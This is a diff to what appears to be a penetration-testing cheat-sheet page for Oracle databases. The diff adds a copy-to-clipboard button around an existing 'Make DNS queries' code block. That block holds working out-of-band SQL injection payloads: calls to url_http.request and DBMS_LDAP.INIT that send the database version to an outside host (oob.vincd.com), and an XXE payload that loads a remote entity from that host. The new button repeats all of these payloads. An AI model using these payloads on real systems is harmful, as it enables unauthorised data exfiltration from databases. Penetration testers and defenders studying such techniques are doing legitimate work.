@@ -370,10 +370,13 @@
             
               <h1>Oracle database</h1>
               <h2 id="make-dns-queries">Make DNS queries</h2>
-<pre><code class="language-sql">SELECT url_http.request((SELECT version FROM v$instance) || 'oob.vincd.com') FROM dual;
+<div class="clipboard-content">  <pre><code class="language-sql">SELECT url_http.request((SELECT version FROM v$instance) || 'oob.vincd.com') FROM dual;
 SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance) || 'oob.vincd.com', 80) FROM dual;
 SELECT Extractvalue(XmlType('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://xxx.oob.vincd.com&quot;&gt; %remote; %param1;]&gt;'), '/L') from dual;
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="SELECT url_http.request((SELECT version FROM v$instance) || 'oob.vincd.com') FROM dual;
+SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance) || 'oob.vincd.com', 80) FROM dual;
+SELECT Extractvalue(XmlType('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://xxx.oob.vincd.com&quot;&gt; %remote; %param1;]&gt;'), '/L') from dual;
+">    Copy  </button></div></div>
             
           </div>
           <footer>
